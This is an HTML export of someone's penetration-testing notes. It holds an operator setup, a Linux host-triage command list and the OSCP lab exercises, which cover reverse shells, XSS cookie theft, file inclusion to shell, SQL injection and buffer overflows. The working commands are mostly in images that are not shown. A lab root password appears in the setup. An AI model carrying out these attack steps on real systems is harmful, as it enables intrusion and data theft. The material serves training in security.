alt="images/1460-23.png" /></a></div><div class='page'><h1 class='title level-5'>04.0 Windows Internals.pdf</h1><br/><a href=""><img src="images/1461-1.png" alt="images/1461-1.png" /></a><br /><br /><a href=""><img src="images/1461-2.png" alt="images/1461-2.png" /></a><br /><br /><a href=""><img src="images/1461-3.png" alt="images/1461-3.png" /></a><br /><br /><a href=""><img src="images/1461-4.png" alt="images/1461-4.png" /></a><br /><br /><a href=""><img src="images/1461-5.png" alt="images/1461-5.png" /></a><br /><br /><a href=""><img src="images/1461-6.png" alt="images/1461-6.png" /></a><br /><br /><a href=""><img src="images/1461-7.png" alt="images/1461-7.png" /></a><br /><br /><a href=""><img src="images/1461-8.png" alt="images/1461-8.png" /></a><br /><br /><a href=""><img src="images/1461-9.png" alt="images/1461-9.png" /></a><br /><br /><a href=""><img src="images/1461-10.png" alt="images/1461-10.png" /></a><br /><br /><a href=""><img src="images/1461-11.png" alt="images/1461-11.png" /></a><br /><br /><a href=""><img src="images/1461-12.png" alt="images/1461-12.png" /></a><a href=""><img src="images/1461-13.png" alt="images/1461-13.png" /></a><a href=""><img src="images/1461-14.png" alt="images/1461-14.png" /></a><a href=""><img src="images/1461-15.png" alt="images/1461-15.png" /></a><a href=""><img src="images/1461-16.png" alt="images/1461-16.png" /></a><a href=""><img src="images/1461-17.png" alt="images/1461-17.png" /></a><a href=""><img src="images/1461-18.png" alt="images/1461-18.png" /></a><a href=""><img src="images/1461-19.png" alt="images/1461-19.png" /></a><a href=""><img src="images/1461-20.png" alt="images/1461-20.png" /></a><a href=""><img src="images/1461-21.png" alt="images/1461-21.png" /></a><a href=""><img src="images/1461-22.png" alt="images/1461-22.png" /></a></div><div class='page'><h1 class='title level-2'>Operator</h1><br/></div><div class='page'><h1 class='title level-3'>Setup</h1><br/>Windows:<br />OPTerminal=Left, Height 100, width 70<br />CherryTree=Upper Right, Height 70, Width 30<br />CatchTerminal=Lower Left, Height 30, Width 30<br /><br />Directories:<br />mkdir {/Yeet,/Yeet/Machines/,/Yeet/Notes}<br /><br />CherryTree:<br />File &gt; Preferences &gt; Keyboard Shortcuts &gt; F5 for timestamp<br />File &gt; Preferences &gt; Special Charachters &gt; Enable Smart Quotes Auto Replacement &gt; Disable<br />save into /Yeet/Notes/OpX<br />Move in (fill in) Operation Template<br /><br />Tmux:<br />tmux new -s Master -d<br />tmux new -s Box	-d<br />tmux new -s Reciever -d<br />tmux new -s Kali</div><div class='page'><h1 class='title level-4'>.vimrc</h1><br/>set mouse-=a<br /><br />nmap &lt;F5&gt; i&lt;C-R&gt;=strftime(&quot;%Y-%m-%d-%H:%M:%S&quot;)&lt;CR&gt;--<br />imap &lt;F5&gt; &lt;C-R&gt;=strftime(&quot;%Y-%m-%d-%H:%M:%S&quot;)&lt;CR&gt;--<br /><br />nmap &lt;F6&gt; i=========================&lt;CR&gt;== T# -- IP ==&lt;CR&gt;{=========================&lt;CR&gt;&lt;CR&gt;&lt;CR&gt;=========================}&lt;CR&gt;<br />imap &lt;F6&gt; =========================&lt;CR&gt;== T# -- IP ==&lt;CR&gt;{=========================&lt;CR&gt;&lt;CR&gt;&lt;CR&gt;=========================}&lt;CR&gt;<br /><br /><br />setlocal foldmethod=marker foldmarker={=========================,=========================}<br /><br />inoremap &lt;F9&gt; &lt;C-O&gt;za<br />nnoremap &lt;F9&gt; za<br />onoremap &lt;F9&gt; &lt;C-C&gt;za<br />vnoremap &lt;F9&gt; zf<br /><br />set number<br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><h3>f5 = timestamp</h3><br /><h3>f6 = new target</h3><br /><h3>f9 = fold target - press with cursor between { }&#39;s</h3></div><div class='page'><h1 class='title level-3'>Operation Template</h1><br/><div class="codebox"><div class="codebox">&gt;210.210.210.2<br />	-&gt;&nbsp;200.200.200.210&nbsp;(Pivot)<br />		--&gt;&nbsp;70.39.165.194&nbsp;(Tgt1)<br />			---&gt;&nbsp;172.16.0.2(Tgt2)<br />				----&gt;&nbsp;172.16.1.1&nbsp;(Tgt3)<br />					-----&gt;&nbsp;172.16.0.6&nbsp;(Tgt4)<br />						------&gt;&nbsp;172.16.3.2&nbsp;(Tgt5)<br />							-------&gt;&nbsp;172.16.2.4&nbsp;(Tgt6)<br />								--------&gt;&nbsp;172.16.3.5&nbsp;(Tgt7)<br />									---------&gt;&nbsp;172.16.3.3&nbsp;(Tgt8)<br />									---------&gt;&nbsp;172.16.3.6&nbsp;(Tgt9)<br />							-------&gt;&nbsp;172.16.2.3&nbsp;(Tgt10)<br />							-------&gt;&nbsp;172.16.2.2&nbsp;(Tgt11)</div></div></div><div class='page'><h1 class='title level-4'>Operation Box</h1><br/>Kali: 40.0.0.x <br />CREDS: root toortoor!<br /></div><div class='page'><h1 class='title level-4'>Pivot root@x.x.x.x:22</h1><br/>CREDS: root toortoor!</div><div class='page'><h1 class='title level-4'>T1</h1><br/></div><div class='page'><h1 class='title level-5'>Commands</h1><br/>General:<br />whoami &amp;&amp; hostname &amp;&amp; date &amp;&amp; date -u &amp;&amp; cat /etc/timezone &amp;&amp; w &amp;&amp; egrep &#39;sudo|wheel&#39; /etc/group<br />ls around<br /><br />Network and Process:<br />ip a<br />netstat -natup<br />ps -elfH<br />history<br />cat .bash_history<br /><br />File Poking:<br />ls -al /tmp    # Look for previous exploits/actors<br />ls -al /dev/shm # Same as tmp (tmp is often noexec, which /dev/shm is not)<br />cat /etc/passwd # Any users other than root with uid/gid of 0<br />ls -latr /var/log # Look for receng logs<br />last # Last time users were on the box<br />lastb # Last failed login attempts<br />ls latr /etc # Look for modified configuration files<br />ls -al /home/*/.ssh/* # User private ssh keys<br />ls -al /root/.ssh/* # Root private ssh keys<br />ls -latr /etc/initd/ # Startup scripts <br />egrep -h &#39;^\.\ /&#39; /etc/init.d/* | sort -u # Look for source files<br />egrep -ho &#39;\.\ /[^\ ]+&#39; /etc/init.d/* | sort -u # More aggressive searh<br />find / -mmin -60 -type f -ls # FInd a file thats been modified last 60 minutes<br />find / -path /proc -prune -o -path /run -prune -o -path /sys -prune -o -mmin -60 -type f -ls<br /><br />Cron Jobs:<br />cat /etc/crontab<br />crontab -l  <br />crontab -l -u root<br />ls -al /var/spool/cron/crontabs/<br />ls -al /etc/cron*<br /><br />Startup Files:<br />ls -al /etc/rc.local<br />more /etc/rc.local<br />echo $PATH</div><div class='page'><h1 class='title level-2'>OSCP Lab Exercises</h1><br/></div><div class='page'><h1 class='title level-3'>OSCP Lab Exercises (2020)</h1><br/><br /></div><div class='page'><h1 class='title level-4'>2.4.3.4 Exercises</h1><br/>☐ Use man to look at the man page for one of your preferred commands.<br /><a href=""><img src="images/1211-1.png" alt="images/1211-1.png" /></a><br />☐ Use man to look for a keyword related to file compression.<br /><a href=""><img src="images/1211-2.png" alt="images/1211-2.png" /></a><br />☐ Use which to locate the pwd command on your Kali virtual machine.<br /><a href=""><img src="images/1211-3.png" alt="images/1211-3.png" /></a><br />☐ Use locate to locate wce32.exe on your Kali virtual machine.<br /><a href=""><img src="images/1211-4.png" alt="images/1211-4.png" /></a><br />☐ Use find to identify any file (not directory) modified in the last day, NOT owned by the root user and execute ls -l on them. Chaining/piping commands is NOT allowed!<br /><a href=""><img src="images/1211-5.png" alt="images/1211-5.png" /></a><br /></div><div class='page'><h1 class='title level-4'>3.1.3.2 Exercises</h1><br/>☐ Inspect your bash history and use history expansion to re-run a command from it.<br /><a href=""><img src="images/1212-1.png" alt="images/1212-1.png" /></a><br />☐ Execute different commands of your choice and experiment browsing the history through the shortcuts as well as the reverse-i-search facility<br /><a href=""><img src="images/1212-2.png" alt="images/1212-2.png" /></a></div><div class='page'><h1 class='title level-4'>3.2.5.1 Exercises</h1><br/>☐ Use the cat command in conjunction with sort to reorder the content of the /etc/passwd file on your Kali Linux system.<br /><a href=""><img src="images/1213-1.png" alt="images/1213-1.png" /></a><br />☐ Redirect the output of the previous exercise to a file of your choice in your home directory.<br /><a href=""><img src="images/1213-2.png" alt="images/1213-2.png" /></a></div><div class='page'><h1 class='title level-4'>3.3.5.1 Exercises</h1><br/>☐ Using /etc/passwd, extract the user and home directory fields for all users on your Kali machine for which the shell is set to /bin/false. Make sure you use a Bash one-liner to print the output to the screen. The output should look similar to Listing 53 below:<br /><a href=""><img src="images/1214-1.png" alt="images/1214-1.png" /></a><br />☐ Copy the /etc/passwd file to your home directory (/home/kali).<br /><a href=""><img src="images/1214-2.png" alt="images/1214-2.png" /></a><br />☐ Use cat in a one-liner to print the output of the /kali/passwd and replace all instances of the “Gnome Display Manager” string with “GDM”<br /><a href=""><img src="images/1214-3.png" alt="images/1214-3.png" /></a></div><div class='page'><h1 class='title level-4'>3.5.3.1 Exercises</h1><br/>☐ Download the archive from the following URL https://offensive-security.com/pwk-files/scans.tar.gz<br /><a href=""><img src="images/1215-1.png" alt="images/1215-1.png" /></a><br />☐ This archive contains the results of scanning the same target machine at different times. Extract the archive and see if you can spot the differences by diffing the scans.<br /><a href=""><img src="images/1215-2.png" alt="images/1215-2.png" /></a><br /><a href=""><img src="images/1215-3.png" alt="images/1215-3.png" /></a><br /><a href=""><img src="images/1215-4.png" alt="images/1215-4.png" /></a></div><div class='page'><h1 class='title level-4'>3.6.3.1 Exercises</h1><br/>☐ Find files that have changed on your Kali virtual machine within the past 7 days by running a specific command in the background.<br /><a href=""><img src="images/1216-1.png" alt="images/1216-1.png" /></a><br />☐ Re-run the previous command and suspend it; once suspended, background it.<br /><a href=""><img src="images/1216-2.png" alt="images/1216-2.png" /></a><br />☐ Bring the previous background job into the foreground.<br /><a href=""><img src="images/1216-3.png" alt="images/1216-3.png" /></a><br />☐ Start the Firefox browser on your Kali system. Use ps and grep to identify Firefox’s PID.<br /><a href=""><img src="images/1216-4.png" alt="images/1216-4.png" /></a><br />☐ Terminate Firefox from the command line using its PID.<br /><a href=""><img src="images/1216-5.png" alt="images/1216-5.png" /></a></div><div class='page'><h1 class='title level-4'>3.7.2.1 Exercises</h1><br/>☐ Start your apache2 web service and access it locally while monitoring its access.log file in real-time.<br /><a href=""><img src="images/1217-1.png" alt="images/1217-1.png" /></a><br />☐ Use a combination of watch and ps to monitor the most CPU-intensive processes on your Kali machine in a terminal window; launch different applications to see how the list changes in real time.<br /><a href=""><img src="images/1217-2.png" alt="images/1217-2.png" /></a></div><div class='page'><h1 class='title level-4'>3.8.3.1 Exercise</h1><br/>☐ Download the PoC code for an exploit from https://www.exploit-db.com using curl, wget, and axel, saving each download with a different name.<br /><a href=""><img src="images/1218-1.png" alt="images/1218-1.png" /></a></div><div class='page'><h1 class='title level-4'>3.9.3.1 Exercises</h1><br/>☐ Create an alias named “..” to change to the parent directory and make it persistent across terminal sessions.<br /><a href=""><img src="images/1219-1.png" alt="images/1219-1.png" /></a><br /><a href=""><img src="images/1219-2.png" alt="images/1219-2.png" /></a><br />☐ Permanently configure the history command to store 10000 entries and include the full date in its output.<br /><a href=""><img src="images/1219-3.png" alt="images/1219-3.png" /></a><br /><a href=""><img src="images/1219-4.png" alt="images/1219-4.png" /></a></div><div class='page'><h1 class='title level-4'>4.2.4.1 Exercises</h1><br/>☐ Use socat to transfer powercat.ps1 from your Kali machine to your Windows system. Keep the file on your system for use in the next section.<br /><a href=""><img src="images/1220-1.png" alt="images/1220-1.png" /></a><br /><a href=""><img src="images/1220-2.png" alt="images/1220-2.png" /></a><br />☐ Use socat to create an encrypted reverse shell from your Windows system to your Kali machine.<br /><a href=""><img src="images/1220-3.png" alt="images/1220-3.png" /></a><br /><a href=""><img src="images/1220-4.png" alt="images/1220-4.png" /></a><br />☐ Create an encrypted bind shell on your Windows system. Try to connect to it from Kali without encryption. Does it still work?<br /><a href=""><img src="images/1220-5.png" alt="images/1220-5.png" /></a><br /><a href=""><img src="images/1220-6.png" alt="images/1220-6.png" /></a><br />☐ Make an unencrypted socat bind shell on your Windows system. Connect to the shell using Netcat. Does it work? Note: If cmd.exe is not executing, research what other parameters you may need to pass to the EXEC option based on the error you receive.<br /><a href=""><img src="images/1220-7.png" alt="images/1220-7.png" /></a><br /><a href=""><img src="images/1220-8.png" alt="images/1220-8.png" /></a><br /><br /><br /><br /><br /><br /><br /><br /></div><div class='page'><h1 class='title level-4'>4.3.8.1 Exercises</h1><br/>☐ Use PowerShell and powercat to create a reverse shell from your Windows system to your Kali machine.<br /><a href=""><img src="images/1221-1.png" alt="images/1221-1.png" /></a><br /><a href=""><img src="images/1221-2.png" alt="images/1221-2.png" /></a><br /><a href=""><img src="images/1221-3.png" alt="images/1221-3.png" /></a><br /><a href=""><img src="images/1221-4.png" alt="images/1221-4.png" /></a><br />☐ Use PowerShell and powercat to create a bind shell on your Windows system and connect to it from your Kali machine. Can you also use powercat to connect to it locally?<br /><a href=""><img src="images/1221-5.png" alt="images/1221-5.png" /></a><br /><a href=""><img src="images/1221-6.png" alt="images/1221-6.png" /></a><br /><br /><a href=""><img src="images/1221-7.png" alt="images/1221-7.png" /></a><br /><a href=""><img src="images/1221-8.png" alt="images/1221-8.png" /></a><br />☐ Use powercat to generate an encoded payload and then have it executed through powershell. Have a reverse shell sent to your Kali machine, also create an encoded bind shell on your Windows system and use your Kali machine to connect to it.<br /><a href=""><img src="images/1221-9.png" alt="images/1221-9.png" /></a><br /><a href=""><img src="images/1221-10.png" alt="images/1221-10.png" /></a><br /><br /><a href=""><img src="images/1221-11.png" alt="images/1221-11.png" /></a><br /><a href=""><img src="images/1221-12.png" alt="images/1221-12.png" /></a><br /><br /><br /><br /><br /><br /><br /></div><div class='page'><h1 class='title level-4'>4.4.5.1 Exercises</h1><br/>☐ Use Wireshark to capture network activity while attempting to connect to 10.11.1.217 on port 110 using Netcat, and then attempt to log into it.<br /><a href=""><img src="images/1222-1.png" alt="images/1222-1.png" /></a><br />☐ Read and understand the output. Where is the three-way handshake happening? Where is the connection closed?<br /><a href=""><img src="images/1222-2.png" alt="images/1222-2.png" /></a><br />☐ Follow the TCP stream to read the login attempt.<br /><a href=""><img src="images/1222-3.png" alt="images/1222-3.png" /></a><br />☐ Use the display filter to only monitor traffic on port 110.<br /><a href=""><img src="images/1222-4.png" alt="images/1222-4.png" /></a><br />☐ Run a new session, this time using the capture filter to only collect traffic on port 110.<br /><a href=""><img src="images/1222-5.png" alt="images/1222-5.png" /></a></div><div class='page'><h1 class='title level-4'>4.5.3.1 Exercises</h1><br/>☐ Use tcpdump to recreate the Wireshark exercise of capturing traffic on port 110.<br /><a href=""><img src="images/1223-1.png" alt="images/1223-1.png" /></a><br />☐ Use the -X flag to view the content of the packet. If data is truncated, investigate how the -s flag might help.<br /><a href=""><img src="images/1223-2.png" alt="images/1223-2.png" /></a><br />☐ Find all ‘SYN’, ‘ACK’, and ‘RST’ packets in the password_cracking_filtered.pcap file.<br /><a href=""><img src="images/1223-3.png" alt="images/1223-3.png" /></a><br />☐ An alternative syntax is available in tcpdump where you can use a more user-friendly filter to display only ACK and PSH packets. Explore this syntax in the tcpdump manual by searching for “tcpflags”. Come up with an equivalent display filter using this syntax to filter ACK and PSH packets. <br /><a href=""><img src="images/1223-4.png" alt="images/1223-4.png" /></a></div><div class='page'><h1 class='title level-4'>5.7.3.1 Exercises</h1><br/>☐ Research Bash loops and write a short script to perform a ping sweep of your target IP range of 10.11.1.0/24.<br /><a href=""><img src="images/1224-1.png" alt="images/1224-1.png" /></a><br />☐ Try to do the above exercise with a higher-level scripting language such as Python, Perl, or Ruby.<br /><a href=""><img src="images/1224-2.png" alt="images/1224-2.png" /></a><br />☐ Use the practical examples in this module to help you create a Bash script that extracts JavaScript files from the access_log.txt file (http://www.offensive-security.com pwkfiles/access_log.txt.gz). Make sure the file names DO NOT include the path, are unique, and are sorted.<br /><a href=""><img src="images/1224-3.png" alt="images/1224-3.png" /></a><br /><a href=""><img src="images/1224-4.png" alt="images/1224-4.png" /></a><br />☐ Re-write the previous exercise in another language such as Python, Perl, or Ruby.<br /><a href=""><img src="images/1224-5.png" alt="images/1224-5.png" /></a><br /><a href=""><img src="images/1224-6.png" alt="images/1224-6.png" /></a></div><div class='page'><h1 class='title level-4'>6.3.1.1 Exercise</h1><br/>☐ Use the whois tool in Kali to identify the name servers of MegaCorp One.<br /><a href=""><img src="images/1225-1.png" alt="images/1225-1.png" /></a></div><div class='page'><h1 class='title level-4'>6.4.1.1 Exercises</h1><br/>☐ Who is the VP of Legal for MegaCorp One and what is their email address?<br /><a href=""><img src="images/1226-1.png" alt="images/1226-1.png" /></a><br />☐ Use Google dorks (either your own or any from the GHDB) to search www.megacorpone.com for interesting documents.<br /><a href=""><img src="images/1226-2.png" alt="images/1226-2.png" /></a> <br /><a href=""><img src="images/1226-3.png" alt="images/1226-3.png" /></a><br />☐ What other MegaCorp One employees can you identify that are not listed on <a href="http://www.megacorpone.com?">www.megacorpone.com?</a><br /><a href=""><img src="images/1226-4.png" alt="images/1226-4.png" /></a><br /><br /><br /><br /></div><div class='page'><h1 class='title level-4'>6.5.1.1 Exercise</h1><br/>☐ Use Netcraft to determine what application server is running on <a href="http://www.megacorpone.com.">www.megacorpone.com.</a><br /><a href=""><img src="images/1227-1.png" alt="images/1227-1.png" /></a></div><div class='page'><h1 class='title level-4'>6.7.1.1 Exercise</h1><br/>☐ Search Megacorpone’s GitHub repos for interesting or sensitive information.<br /><a href=""><img src="images/1228-1.png" alt="images/1228-1.png" /></a></div><div class='page'><h1 class='title level-4'>6.12.1.1 Exercises</h1><br/>☐ Use theHarvester to enumerate emails addresses for megacorpone.com.<br /><a href=""><img src="images/1229-1.png" alt="images/1229-1.png" /></a><br />☐ Experiment with different data sources (-b). Which ones work best for you?<br /><a href=""><img src="images/1229-2.png" alt="images/1229-2.png" /></a></div><div class='page'><h1 class='title level-4'>6.13.2.1 Exercise</h1><br/>☐ Use any of the social media tools previously discussed to identify additional MegaCorp One employees.<br /><a href=""><img src="images/1230-1.png" alt="images/1230-1.png" /></a></div><div class='page'><h1 class='title level-4'>7.1.6.3 Exercises</h1><br/>☐ Find the DNS servers for the megacorpone.com domain.<br /><a href=""><img src="images/1231-1.png" alt="images/1231-1.png" /></a><br />☐ Write a small script to attempt a zone transfer from megacorpone.com using a higher-level scripting language such as Python, Perl, or Ruby.<br /><a href=""><img src="images/1231-2.png" alt="images/1231-2.png" /></a><br /><a href=""><img src="images/1231-3.png" alt="images/1231-3.png" /></a><br />☐ Recreate the example above and use dnsrecon to attempt a zone transfer from megacorpone.com.<br /><a href=""><img src="images/1231-4.png" alt="images/1231-4.png" /></a></div><div class='page'><h1 class='title level-4'>7.2.2.9 Exercises</h1><br/>☐ Use Nmap to conduct a ping sweep of your target IP range and save the output to a file. Use grep to show machines that are online.<br /><a href=""><img src="images/1232-1.png" alt="images/1232-1.png" /></a><br /><a href=""><img src="images/1232-2.png" alt="images/1232-2.png" /></a><br />☐ Scan the IP addresses you found in exercise 1 for open webserver ports. Use Nmap to find the webserver and operating system versions.<br /><a href=""><img src="images/1232-3.png" alt="images/1232-3.png" /></a><br /><a href=""><img src="images/1232-4.png" alt="images/1232-4.png" /></a><br />☐ Use NSE scripts to scan the machines in the labs that are running the SMB service.<br /><a href=""><img src="images/1232-5.png" alt="images/1232-5.png" /></a><br />☐ Use Wireshark to capture a Nmap connect and UDP scan and compare it against the Netcat port scans. Are they the same or different?<br />connect<br /><a href=""><img src="images/1232-6.png" alt="images/1232-6.png" /></a><br />UDP<br /><a href=""><img src="images/1232-7.png" alt="images/1232-7.png" /></a><br />nc<br /><a href=""><img src="images/1232-8.png" alt="images/1232-8.png" /></a><br />The connect and UDP scans are different from one another becasue the connect scan uses TCP. Tcp scans will begin with a three way handshake ([SYN], [SYN, ACK], [ACK]) as seen in the connect scan and in the nc scan from previously.<br /><br /><br /><br />☐ Use Wireshark to capture a Nmap SYN scan and compare it to a connect scan and identify the difference between them.<br />SYN<br /><a href=""><img src="images/1232-9.png" alt="images/1232-9.png" /></a><br />connect<br /><a href=""><img src="images/1232-10.png" alt="images/1232-10.png" /></a><br />SYN scans are diffent from connect scans becasue the three way handshake is never completed in a syn scan. The scanning machine may recieve a [SYN, ACK], but won&#39;t complete the connection with an [ACK].<br /><br /><br /><br /><br /><br /><br /><br /></div><div class='page'><h1 class='title level-4'>7.3.2.1 Exercises</h1><br/>☐ Use Nmap to make a list of the SMB servers in the lab that are running Windows.<br /><a href=""><img src="images/1233-1.png" alt="images/1233-1.png" /></a><br /><a href=""><img src="images/1233-2.png" alt="images/1233-2.png" /></a><br />☐ Use NSE scripts to scan these systems for SMB vulnerabilities.<br /><a href=""><img src="images/1233-3.png" alt="images/1233-3.png" /></a><br />☐ Use nbtscan and enum4linux against these systems to identify the types of data you can obtain from different versions of Windows.<br /><a href=""><img src="images/1233-4.png" alt="images/1233-4.png" /></a></div><div class='page'><h1 class='title level-4'>7.4.2.1 Exercises</h1><br/>☐ Use Nmap to make a list of machines running NFS in the labs.<br /><a href=""><img src="images/1234-1.png" alt="images/1234-1.png" /></a><br /><a href=""><img src="images/1234-2.png" alt="images/1234-2.png" /></a><br />☐ Use NSE scripts to scan these systems and collect additional information about accessible shares.<br /><a href=""><img src="images/1234-3.png" alt="images/1234-3.png" /></a></div><div class='page'><h1 class='title level-4'>7.5.1.1 Exercises</h1><br/>☐ Search your target network range to see if you can identify any systems that respond to the SMTP VRFY command.<br /><a href=""><img src="images/1235-1.png" alt="images/1235-1.png" /></a><br /><a href=""><img src="images/1235-2.png" alt="images/1235-2.png" /></a><br />☐ Try using this Python code to automate the process of username discovery using a text file with usernames as input.<br /><a href=""><img src="images/1235-3.png" alt="images/1235-3.png" /></a><br /><a href=""><img src="images/1235-4.png" alt="images/1235-4.png" /></a></div><div class='page'><h1 class='title level-4'>7.6.3.6 Exercises</h1><br/>☐ Scan your target network with onesixtyone to identify any SNMP servers.<br /><a href=""><img src="images/1236-1.png" alt="images/1236-1.png" /></a><br />☐ Use snmpwalk and snmp-check to gather information about the discovered targets.<br /><a href=""><img src="images/1236-2.png" alt="images/1236-2.png" /></a><br /><a href=""><img src="images/1236-3.png" alt="images/1236-3.png" /></a><br /><a href=""><img src="images/1236-4.png" alt="images/1236-4.png" /></a></div><div class='page'><h1 class='title level-4'>8.2.4.2 Exercises</h1><br/>☐ Follow the steps above to create your own unauthenticated scan of Gamma.<br /><a href=""><img src="images/1237-1.png" alt="images/1237-1.png" /></a><br />☐ Run the scan with Wireshark open and identify the steps the scanner performed to completed the scan.<br /><a href=""><img src="images/1237-2.png" alt="images/1237-2.png" /></a><br />The scanner used SNMP, ICMP, and TCP methods to verigy the host was up before making a connection and begining further scanning, which started with server message block protocol.<br />☐ Review the results of the scan.<br /><a href=""><img src="images/1237-3.png" alt="images/1237-3.png" /></a><br />It appears as if a PHP update would solve the majority of the critical and high vulnerabilities.</div><div class='page'><h1 class='title level-4'>8.2.5.2 Exercises</h1><br/>☐ Follow the steps above to create your own authenticated scan of your Debian client.<br /><a href=""><img src="images/1238-1.png" alt="images/1238-1.png" /></a><br />☐ Review the results of the scan.<br /><a href=""><img src="images/1238-2.png" alt="images/1238-2.png" /></a><br />It appears that the machine should be updated to the latest version of the Debian OS.</div><div class='page'><h1 class='title level-4'>8.2.6.1 Exercises</h1><br/>☐ Follow the steps above to create your own individual scan of Beta.<br /><a href=""><img src="images/1239-1.png" alt="images/1239-1.png" /></a><br />☐ Run Wireshark or tcpdump during the individual scan. What other ports does Nessus scan? Why do you think Nessus scans other ports?<br /><a href=""><img src="images/1239-2.png" alt="images/1239-2.png" /></a><br />Nessus also scans 81, 445, 80, 21, 23, just to name a few. Accoding to the pdf, “this happens because port scanning is only one part of Nessus’s scanning profile and most vulnerability scanners run additional services and plugins to gather target information behind the scenes.”<br />☐ Review the results of the scan.<br /><a href=""><img src="images/1239-3.png" alt="images/1239-3.png" /></a></div><div class='page'><h1 class='title level-4'>8.3.1.1 Exercise</h1><br/>☐ Find an NSE script similar to the NFS Exported Share Information Disclosure that was executed in the “Scanning with Individual Nessus Plugins” section. Once found, run the script against Beta in the PWK labs<br /><a href=""><img src="images/1240-1.png" alt="images/1240-1.png" /></a></div><div class='page'><h1 class='title level-4'>9.3.4.1 Exercise</h1><br/>☐ Spend some time reviewing the applications available under the Web Application Analysis menu in Kali Linux.<br /><a href=""><img src="images/1241-1.png" alt="images/1241-1.png" /></a><br /><a href=""><img src="images/1241-2.png" alt="images/1241-2.png" /></a></div><div class='page'><h1 class='title level-4'>9.4.1.3 Exercises</h1><br/>☐ Use Burp Intruder to gain access to the phpMyAdmin site running on your Windows 10 lab machine.<br /><a href=""><img src="images/1242-1.png" alt="images/1242-1.png" /></a><br />☐ Insert a new user into the “users” table.<br /><a href=""><img src="images/1242-2.png" alt="images/1242-2.png" /></a></div><div class='page'><h1 class='title level-4'>9.4.2.5 Exercises</h1><br/>☐ Exploit the XSS vulnerability in the sample application to get the admin cookie and hijack the session. Remember to use the PowerShell script on your Windows 10 lab machine to simulate the admin login.<br /><a href=""><img src="images/1243-1.png" alt="images/1243-1.png" /></a><br /><a href=""><img src="images/1243-2.png" alt="images/1243-2.png" /></a><br />☐ Consider what other ways an XSS vulnerability in this application might be used for attacks.<br /><a href=""><img src="images/1243-3.png" alt="images/1243-3.png" /></a><br />According to the documentation, &quot;other examples of XSS payloads include keystroke loggers, phishing attacks, port scanning, and content scrapers/skimmers.&quot; <br />☐ Does this exploit attack the server or clients of the site?<br />Clients, becasue we are stealing their tokens, and are dependent upon their action.<br /><br /></div><div class='page'><h1 class='title level-4'>9.4.3.2 Exercise</h1><br/>☐ Exploit the directory traversal vulnerability to read arbitrary files on your Windows 10 lab machine.<br /><a href=""><img src="images/1244-1.png" alt="images/1244-1.png" /></a></div><div class='page'><h1 class='title level-4'>9.4.4.5 Exercises</h1><br/>☐ Obtain code execution through the use of the LFI attack.<br /><a href=""><img src="images/1245-1.png" alt="images/1245-1.png" /></a><br />☐ Use the code execution to obtain a full shell.<br /><a href=""><img src="images/1245-2.png" alt="images/1245-2.png" /></a><br /><a href=""><img src="images/1245-3.png" alt="images/1245-3.png" /></a></div><div class='page'><h1 class='title level-4'>9.4.4.7 Exercises</h1><br/>☐ Exploit the RFI vulnerability in the web application and get a shell.<br /><a href=""><img src="images/1246-1.png" alt="images/1246-1.png" /></a><br /><a href=""><img src="images/1246-2.png" alt="images/1246-2.png" /></a><br />☐ Using /menu2.php?file=current_menu as a starting point, use RFI to get a shell.<br /><a href=""><img src="images/1246-3.png" alt="images/1246-3.png" /></a><br /><a href=""><img src="images/1246-4.png" alt="images/1246-4.png" /></a><br />☐ Use one of the webshells included with Kali to get a shell on the Windows 10 target<br /><a href=""><img src="images/1246-5.png" alt="images/1246-5.png" /></a><br /><a href=""><img src="images/1246-6.png" alt="images/1246-6.png" /></a></div><div class='page'><h1 class='title level-4'>9.4.4.10 Exercises</h1><br/>☐ Exploit the LFI vulnerability using a PHP wrapper.<br /><a href=""><img src="images/1247-1.png" alt="images/1247-1.png" /></a><br />☐ Use a PHP wrapper to get a shell on your Windows 10 lab machine.<br /><a href=""><img src="images/1247-2.png" alt="images/1247-2.png" /></a><br /><a href=""><img src="images/1247-3.png" alt="images/1247-3.png" /></a><br /></div><div class='page'><h1 class='title level-4'>9.4.5.4 Exercises</h1><br/>☐ Interact with the MariaDB database and manually execute the commands required to authenticate to the application. Understand the vulnerability.<br /><a href=""><img src="images/1248-1.png" alt="images/1248-1.png" /></a><br />☐ SQL inject the username field to bypass the login process.<br /><a href=""><img src="images/1248-2.png" alt="images/1248-2.png" /></a><br />☐ Why is the username displayed like it is in the web application once the authentication process is bypassed?<br />The username field is not a name pulled from a databse, instead is literally the name given in the field, which in this case results to True before getting to the password field.<br />☐ Execute the SQL injection in the password field. Is the “LIMIT 1” necessary in the payload? Why or why not?<br />The “Limit 1” field is necessary becasue the query wants to return more than one row, which would not allow us to login. </div><div class='page'><h1 class='title level-4'>9.4.5.9 Exercises</h1><br/>☐ Enumerate the structure of the database using SQL injection.<br /><a href=""><img src="images/1249-1.png" alt="images/1249-1.png" /></a><br /><a href=""><img src="images/1249-2.png" alt="images/1249-2.png" /></a><br /><a href=""><img src="images/1249-3.png" alt="images/1249-3.png" /></a><br /><br />☐ Understand how and why you can pull data from your injected commands and have it displayed on the screen.<br />On line line 39 there is no data sanitization which allows us to inject our own query. We use a union so we can show multiple objects from other tables.<br /><br />☐ Extract all users and associated passwords from the database.<br /><a href=""><img src="images/1249-4.png" alt="images/1249-4.png" /></a><br /><a href=""><img src="images/1249-5.png" alt="images/1249-5.png" /></a><br /><br /><br /><br /><br /><br /><br /><br /></div><div class='page'><h1 class='title level-4'>9.4.5.11 Exercises</h1><br/><br />☐ Exploit the SQL injection along with the MariaDB INTO OUTFILE function to obtain code execution.<br /><a href=""><img src="images/1250-1.png" alt="images/1250-1.png" /></a><br /><a href=""><img src="images/1250-2.png" alt="images/1250-2.png" /></a><br /><br />☐ Turn the simple code execution into a full shell.<br /><a href=""><img src="images/1250-3.png" alt="images/1250-3.png" /></a><br /><a href=""><img src="images/1250-4.png" alt="images/1250-4.png" /></a></div><div class='page'><h1 class='title level-4'>9.4.5.13 Exercises</h1><br/>☐ Use sqlmap to obtain a full dump of the database.<br /><a href=""><img src="images/1251-1.png" alt="images/1251-1.png" /></a><br />☐ Use sqlmap to obtain an interactive shell<br /><a href=""><img src="images/1251-2.png" alt="images/1251-2.png" /></a></div><div class='page'><h1 class='title level-4'>10.2.5 Exercises</h1><br/>☐ Repeat the steps shown in this section to see the 12 A’s copied onto the stack.<br /><a href=""><img src="images/1252-1.png" alt="images/1252-1.png" /></a><br />☐ Supply at least 80 A’s and verify that EIP after the strcpy will contain the value 41414141.<br /><a href=""><img src="images/1252-2.png" alt="images/1252-2.png" /></a></div><div class='page'><h1 class='title level-4'>11.1.1.2 